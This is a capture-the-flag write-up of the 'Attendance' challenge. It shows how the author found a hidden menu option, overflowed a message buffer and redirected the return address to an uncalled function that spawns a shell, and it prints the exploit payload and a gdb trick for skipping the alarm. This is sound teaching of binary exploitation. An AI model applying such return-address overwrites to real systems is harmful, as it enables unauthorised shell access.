### Attendance
50 points
> hmmm, I feel not all students are attending my lesson today, someone missing?
>
> remote: 89.38.210.128 31337

---

We get given an ip address and the (linux) executable running on it. First I spent a while setting up a proper linux vm, as it turns out bash on windows just doesn't support 32-bit executables. When you run the executable you end up with something along the lines of the following:

```
t@t:~$ nc 89.38.210.128 31337
Call> Bob
No such student
t@t:~$
```

Messing with it I noticed that if you typed more than 6 characters you'd lose the last new line, and if you were running it locally the extra characters would then spill out into your console. I then installed Binary Ninja in order to debug it further. When you open up main there's a nice repeating pattern.

![Disassembly Pattern][00_Disassembly]

Looking at this more closely you can see that before the first jump it checks if a variable is equal to 0x1, if not it jumps. Then it checks if it's equal to 0x2, if not it jumps, and this continues all the way up to 0x5. If at any point it is equal, it instead moves on to call a function "student_n", where n is the value it was comparing to. After all the student blocks, however, there's another one, comparing to 0x7a69, and then jumping to "principal". This was interesting, and I wanted to work out a way to get to it. From a hunch I tried entering just "1" into the program and look at what I got:

```
t@t:~$ nc 89.38.210.128 31337
Call> 1
Student 1 - present
t@t:~$
```

From this I should have just gone on to try 0x7a69 - 31337, but instead I spent quite a while in gdb trying to work out what exactly was happening to my input. When I eventually did try that though, the following happened:

```
t@t:~$ ./attendance
Call> 31337
Leave a Message for the principal, please:
test
Principal got your message test
t@t:~$
```

Then I found something else more interesting

```
t@t:~$ ./attendance
Call> 31337
Leave a Message for the principal, please:
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
Principal got your message AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPP
Segmentation fault
t@t:~$ PQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
PQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ: command not found
t@t:~$
```

So firstly, we only have 63 characters (and the newline) to work with, but more interestingly we have a buffer overflow. The challenge later got a hint about exactly this. Getting the segfault in gdb gives the following more detailed error:

```
Progran recived signal SIGSEV, Segmentation fault.
0x4d4d4d4d in ?? ()
```

0x4d4d4d4d corresponds to 'MMMM'. So I went to try find exactly caused it, and what I could substitute in. But while trying this, I repeatedly came across a really annoying feature I decided I had to deal with first. If you spend too long, the program just kicks you out, even in gdb. Back in Binary Ninja I found what was causing that:

![Alarm call][01_Alarm]

So to avoid that, in gdb I did the following:

```
(gdb) break *0x080486bd
Breakpoint 11 at 0x80486bd
(gdb) command
Type commands for breakpoint(s) 11, one per line.
End with a line saying just "end".
>silent
>jump *0x08048c5
>c
>end
(gdb)
```

With this in place I could safely continue debugging. I eventually found out the segfault was coming from the return of the principal function. In Binary Ninja there was a function "bring\_students\_to\_school", which wasn't being called from anywhere, so I figured what if I change the return to point to there. The disassembly included the string "/bin/sh" and had a call straight to system, which definitely seemed promising. So I setup a breakpoint right after the input, _input nothing_, and then set the correct bytes to the return address. And it worked. I had a bash shell there. So I went ahead trying to recreate this in my actual shell.

```
t@t:~$ echo -e "31337\nAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLL\x60\x86\x04\x08" | ./attendance
Call> Leave a message for the principal, please:
Principal got your message AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLL`▒
Segmentation fault
t@t:~$
```

Well that's not good. What I thought happened here was that I'd overwritten some other crucial byte with the rest of my text, remember in gdb I entered nothing, so I spent way too long mapping everything out, working what bytes I'd have to set everything to so that it was the same, and working out where nulls could be replaced with 0x01. In actuality what was happening was address space layout randomization, the function just wasn't in the same place on my system. As it turns out both gdb and the remote sever had this disabled, so I was really right all along. The last problem was just inputting it, as netcat wasn't printing anything if I piped stuff in. Because of this I copied a quick bit of code from stackoverflow, adjusted it a bit, and then just did everything through python. And it worked. A bit of exploring the file system later and...

```
t@t:~$ python attendance.py cat /home/attendance/flag
timctf{l1ttl3_th1ngs_m4k3_b1g_th1ngs_h4pp3n}
```


[00_Disassembly]: ../images/07_00_disassembly.png
[01_Alarm]: ../images/07_01_alarm.png
